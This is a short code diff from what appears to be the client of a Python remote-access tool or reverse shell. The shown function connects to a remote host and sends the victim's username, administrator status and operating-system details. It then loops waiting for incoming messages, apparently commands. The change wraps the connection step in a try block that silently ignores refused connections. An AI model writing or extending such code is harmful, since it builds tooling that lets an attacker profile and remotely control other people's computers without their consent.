@@ -23,15 +23,19 @@ def outbound(message):
     sock.send(response)
 
 def session_handler():
-    print(f"[+] Connecting to {host_ip}.")
-    sock.connect((host_ip, host_port))
-    outbound(os.getlogin())
-    outbound(ctypes.windll.shell32.IsUserAnAdmin)
-    time.sleep(1)
-    op_sys = platform.uname()
-    op_sys = (f'{op_sys[0]} {op_sys[2]}')
-    outbound(op_sys)
-    print(f"[+] Connected to {host_ip}.")
+    try:
+        print(f"[+] Connecting to {host_ip}.")
+        sock.connect((host_ip, host_port))
+        outbound(os.getlogin())
+        outbound(ctypes.windll.shell32.IsUserAnAdmin)
+        time.sleep(1)
+        op_sys = platform.uname()
+        op_sys = (f'{op_sys[0]} {op_sys[2]}')
+        outbound(op_sys)
+        print(f"[+] Connected to {host_ip}.")
+
+    except ConnectionRefusedError:
+        pass
 
     while True:
         message = inbound()
